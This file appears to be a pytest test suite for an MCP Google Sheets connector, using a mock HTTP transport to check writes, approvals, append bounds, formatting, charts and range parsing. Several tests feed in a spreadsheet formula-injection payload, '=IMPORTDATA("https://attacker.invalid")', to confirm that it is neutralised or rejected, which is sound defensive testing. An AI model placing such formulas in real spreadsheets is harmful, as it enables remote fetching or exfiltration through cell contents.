from __future__ import annotations

import copy
import json
from typing import Any
from urllib.parse import unquote

import httpx
import pytest
from mcp_sheets.providers.google import GoogleSheets
from mcp_sheets.providers.ranges import parse_range
from mcp_sheets.schemas.add_sheet import AddSheet
from mcp_sheets.schemas.create_spreadsheet import CreateSpreadsheet
from mcp_sheets.schemas.write_range import WriteRange
from mcp_sheets.server import tool_definitions
from mcp_workspace_common.errors import ConnectorError
from mcp_workspace_common.providers.google_client import GoogleClient
from pydantic import ValidationError


async def token() -> str:
    return "synthetic-token"


class SpreadsheetHTTP:
    def __init__(self) -> None:
        self.metadata: dict[str, Any] = {
            "spreadsheetId": "spreadsheet1",
            "properties": {"title": "Actual workbook"},
            "sheets": [
                {
                    "properties": {
                        "sheetId": 0,
                        "title": "Data",
                        "gridProperties": {"rowCount": 1000, "columnCount": 26},
                    }
                }
            ],
        }
        self.values: dict[int, list[list[Any]]] = {0: [["Header", "Value"], ["Existing", 7]]}
        self.version = 1
        self.formatting: dict[tuple[int, int, int], dict[str, Any]] = {}
        self.writes: list[dict[str, Any]] = []
        self.created_metadata: dict[str, Any] | None = None

    def __call__(self, request: httpx.Request) -> httpx.Response:
        if request.url.host == "www.googleapis.com":
            if request.method == "POST":
                self.created_metadata = json.loads(request.content)
                self.metadata["properties"]["title"] = self.created_metadata["name"]
                self.values = {0: []}
                return httpx.Response(200, json={"id": "spreadsheet1"})
            if request.url.path.endswith("/files"):
                return httpx.Response(200, json={"files": []})
            return httpx.Response(200, json={"id": "spreadsheet1", "version": str(self.version)})
        if request.method == "GET":
            if "userEnteredFormat" in request.url.params.get("fields", ""):
                name, start, end, left, right = parse_range(request.url.params["ranges"])
                sheet = next(
                    item["properties"]
                    for item in self.metadata["sheets"]
                    if name is None or item["properties"]["title"] == name
                )
                data = {
                    "startRow": start,
                    "startColumn": left,
                    "rowData": [
                        {
                            "values": [
                                {
                                    "userEnteredFormat": copy.deepcopy(
                                        self.formatting.get((sheet["sheetId"], row, column), {})
                                    )
                                }
                                for column in range(left, right)
                            ]
                        }
                        for row in range(start, end)
                    ],
                }
                return httpx.Response(200, json={"sheets": [{"data": [data]}]})
            if "/values/" in request.url.path:
                selected = unquote(request.url.path.split("/values/", 1)[1])
                name, start, end, left, right = parse_range(selected)
                sheet = next(
                    item["properties"]
                    for item in self.metadata["sheets"]
                    if name is None or item["properties"]["title"] == name
                )
                rows = self.values.get(sheet["sheetId"], [])
                return httpx.Response(
                    200,
                    json={
                        "range": selected,
                        "values": [row[left:right] for row in rows[start:end]],
                    },
                )
            return httpx.Response(200, json=copy.deepcopy(self.metadata))
        body = json.loads(request.content)
        self.writes.append(body)
        replies = []
        for change in body["requests"]:
            replies.append({})
            if "updateSheetProperties" in change:
                properties = change["updateSheetProperties"]["properties"]
                current = next(
                    item["properties"]
                    for item in self.metadata["sheets"]
                    if item["properties"]["sheetId"] == properties["sheetId"]
                )
                current.update(properties)
            if "addSheet" in change:
                properties = dict(change["addSheet"]["properties"])
                properties.setdefault("sheetId", len(self.metadata["sheets"]))
                self.metadata["sheets"].append({"properties": properties})
                self.values[properties["sheetId"]] = []
            if "repeatCell" in change:
                repeat = change["repeatCell"]
                selected = repeat["range"]
                for row in range(selected.get("startRowIndex", 0), selected.get("endRowIndex", 1)):
                    for column in range(
                        selected.get("startColumnIndex", 0), selected.get("endColumnIndex", 2)
                    ):
                        self.formatting[(selected["sheetId"], row, column)] = repeat["cell"][
                            "userEnteredFormat"
                        ]
            if "addChart" in change:
                chart = dict(change["addChart"]["chart"])
                chart["chartId"] = 100
                self.metadata["sheets"][0].setdefault("charts", []).append(chart)
                replies[-1] = {"addChart": {"chart": chart}}
            if "updateCells" in change:
                update = change["updateCells"]
                start = update["start"]
                rows = self.values.setdefault(start["sheetId"], [])
                for offset, row in enumerate(update["rows"]):
                    index = start["rowIndex"] + offset
                    while len(rows) <= index:
                        rows.append([])
                    for column_offset, cell in enumerate(row["values"]):
                        column = start["columnIndex"] + column_offset
                        while len(rows[index]) <= column:
                            rows[index].append(None)
                        rows[index][column] = next(
                            iter(cell.get("userEnteredValue", {"null": None}).values())
                        )
        self.version += 1
        return httpx.Response(200, json={"replies": replies})


async def test_typed_cell_writes_cannot_execute_plain_formula_strings() -> None:
    transport = SpreadsheetHTTP()
    async with httpx.AsyncClient(transport=httpx.MockTransport(transport)) as client:
        provider = GoogleSheets(GoogleClient(token, client))
        args = {
            "spreadsheet_id": "spreadsheet1",
            "range": "Data!A1:B2",
            "values": [
                [
                    '=IMPORTDATA("https://attacker.invalid")',
                    {"type": "formula", "value": "=SUM(B1:B2)"},
                ],
                [True, 12],
            ],
        }
        approved = await provider.snapshot("write_range", args)
        result = await provider.call("write_range", args | {"_snapshot": approved})
    cells = transport.writes[0]["requests"][0]["updateCells"]["rows"][0]["values"]
    assert cells[0]["userEnteredValue"] == {
        "stringValue": '=IMPORTDATA("https://attacker.invalid")'
    }
    assert cells[1]["userEnteredValue"] == {"formulaValue": "=SUM(B1:B2)"}
    assert result["verified"] and result["values"][1] == [True, 12]


async def test_stale_spreadsheet_approval_is_rejected_before_write() -> None:
    transport = SpreadsheetHTTP()
    async with httpx.AsyncClient(transport=httpx.MockTransport(transport)) as client:
        provider = GoogleSheets(GoogleClient(token, client))
        args = {"spreadsheet_id": "spreadsheet1", "range": "Data!A1:B2", "values": [["New", 4]]}
        approved = await provider.snapshot("write_range", args)
        transport.values[0][1][1] = 99
        with pytest.raises(ConnectorError) as error:
            await provider.call("write_range", args | {"_snapshot": approved})
    assert error.value.code == "stale_action" and not transport.writes


async def test_append_uses_empty_rows_inside_approved_bounds() -> None:
    transport = SpreadsheetHTTP()
    async with httpx.AsyncClient(transport=httpx.MockTransport(transport)) as client:
        provider = GoogleSheets(GoogleClient(token, client))
        args = {"spreadsheet_id": "spreadsheet1", "range": "Data!A1:B4", "values": [["New", 8]]}
        approved = await provider.snapshot("append_rows", args)
        result = await provider.call("append_rows", args | {"_snapshot": approved})
    assert transport.values[0] == [["Header", "Value"], ["Existing", 7], ["New", 8]]
    assert transport.writes[0]["requests"][0]["updateCells"]["start"]["rowIndex"] == 2
    assert result["status"] == "updated"


async def test_append_refuses_to_overflow_approved_range() -> None:
    transport = SpreadsheetHTTP()
    async with httpx.AsyncClient(transport=httpx.MockTransport(transport)) as client:
        provider = GoogleSheets(GoogleClient(token, client))
        args = {"spreadsheet_id": "spreadsheet1", "range": "Data!A1:B2", "values": [["New", 8]]}
        approved = await provider.snapshot("append_rows", args)
        with pytest.raises(ConnectorError, match="exceed"):
            await provider.call("append_rows", args | {"_snapshot": approved})
    assert not transport.writes


async def test_native_creation_populates_multiple_tabs_and_reconciles_operation_marker() -> None:
    transport = SpreadsheetHTTP()
    async with httpx.AsyncClient(transport=httpx.MockTransport(transport)) as client:
        provider = GoogleSheets(GoogleClient(token, client))
        result = await provider.call(
            "create_spreadsheet",
            {
                "title": "Generated workbook",
                "idempotency_key": "operation1",
                "sheets": [
                    {
                        "name": "Current Year",
                        "columns": ["Item", "Cost"],
                        "rows": [
                            [
                                {"type": "string", "value": "Hosting"},
                                {"type": "number", "value": 20},
                            ]
                        ],
                    },
                    {
                        "name": "Summary",
                        "columns": ["Total"],
                        "rows": [[{"type": "formula", "value": "=SUM(A1:A2)"}]],
                    },
                ],
            },
        )
    assert result["status"] == "created" and result["verified"]
    assert transport.created_metadata["appProperties"] == {"workspace_operation": "operation1"}
    assert [item["properties"]["title"] for item in result["spreadsheet"]["sheets"]] == [
        "Current Year",
        "Summary",
    ]
    assert transport.values[0][1] == ["Hosting", 20]
    assert transport.values[1][1] == ["=SUM(A1:A2)"]


async def test_format_and_chart_payloads_are_bounded_and_typed() -> None:
    transport = SpreadsheetHTTP()
    async with httpx.AsyncClient(transport=httpx.MockTransport(transport)) as client:
        provider = GoogleSheets(GoogleClient(token, client))
        formatting = {
            "spreadsheet_id": "spreadsheet1",
            "range": "Data!A1:B2",
            "bold": False,
            "background_color": "#ff0000",
        }
        snapshot = await provider.snapshot("format_range", formatting)
        await provider.call("format_range", formatting | {"_snapshot": snapshot})
        chart = {"spreadsheet_id": "spreadsheet1", "range": "Data!A1:B2", "title": "Costs"}
        snapshot = await provider.snapshot("add_chart", chart)
        await provider.call("add_chart", chart | {"_snapshot": snapshot})
    repeat = transport.writes[0]["requests"][0]["repeatCell"]
    assert repeat["cell"]["userEnteredFormat"]["textFormat"]["bold"] is False
    assert repeat["cell"]["userEnteredFormat"]["backgroundColor"]["red"] == 1
    spec = transport.writes[1]["requests"][0]["addChart"]["chart"]["spec"]
    assert spec["basicChart"]["chartType"] == "COLUMN"
    assert (
        spec["basicChart"]["series"][0]["series"]["sourceRange"]["sources"][0]["endColumnIndex"]
        == 2
    )


async def test_add_sheet_preserves_existing_content() -> None:
    transport = SpreadsheetHTTP()
    async with httpx.AsyncClient(transport=httpx.MockTransport(transport)) as client:
        provider = GoogleSheets(GoogleClient(token, client))
        args = {"spreadsheet_id": "spreadsheet1", "title": "New tab"}
        approved = await provider.snapshot("add_sheet", args)
        result = await provider.call("add_sheet", args | {"_snapshot": approved})
    assert transport.values[0][1] == ["Existing", 7]
    assert result["spreadsheet"]["sheets"][-1]["properties"]["title"] == "New tab"


@pytest.mark.parametrize(
    "value", ["A:A", "A1:ZZ999999", "A2:A1", "https://attacker.invalid", "'bad\nname'!A1:B2"]
)
def test_ranges_require_explicit_bounded_a1_cells(value: str) -> None:
    with pytest.raises(ValueError):
        parse_range(value)


def test_schemas_reject_unsafe_formula_and_invalid_native_content() -> None:
    with pytest.raises(ValidationError):
        WriteRange(
            spreadsheet_id="sheet1",
            range="A1",
            values=[[{"type": "formula", "value": '=IMPORTDATA("https://attacker.invalid")'}]],
        )
    with pytest.raises(ValidationError):
        AddSheet(spreadsheet_id="sheet1", title="[invalid]")
    with pytest.raises(ValidationError):
        CreateSpreadsheet(
            title="Bad",
            sheets=[
                {"name": "Data", "columns": ["A"], "rows": []},
                {"name": "data", "columns": ["B"], "rows": []},
            ],
        )
    assert parse_range("'Current Year'!A1:B2") == ("Current Year", 0, 2, 0, 2)
    assert all(
        tool.risk == "ACCOUNT_WRITE"
        for name, tool in tool_definitions().items()
        if name not in {"sheets.get_spreadsheet", "sheets.read_range"}
    )


async def test_reconciliation_verifies_values_before_claiming_success() -> None:
    transport = SpreadsheetHTTP()

    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.host == "www.googleapis.com":
            assert request.method == "GET"
            return httpx.Response(200, json={"files": [{"id": "spreadsheet1"}]})
        return transport(request)

    async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as client:
        result = await GoogleSheets(GoogleClient(token, client)).call(
            "create_spreadsheet",
            {
                "title": "Workbook",
                "idempotency_key": "operation1",
                "sheets": [
                    {
                        "name": "Data",
                        "columns": ["Header", "Value"],
                        "rows": [
                            [
                                {"type": "string", "value": "Required"},
                                {"type": "number", "value": 99},
                            ]
                        ],
                    }
                ],
            },
        )
    assert result["partial"] and not result["verified"]
    assert not transport.writes and transport.created_metadata is None


async def test_reads_return_computed_values_alongside_formulas() -> None:
    transport = SpreadsheetHTTP()

    def handler(request: httpx.Request) -> httpx.Response:
        if "/values/" in request.url.path:
            value = "=SUM(B1:B2)" if request.url.params["valueRenderOption"] == "FORMULA" else 42
            return httpx.Response(200, json={"values": [[value]]})
        return transport(request)

    async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as client:
        result = await GoogleSheets(GoogleClient(token, client)).call(
            "read_range", {"spreadsheet_id": "spreadsheet1", "range": "Data!B3"}
        )
    assert result["values"] == [[42]] and result["formula_values"] == [["=SUM(B1:B2)"]]
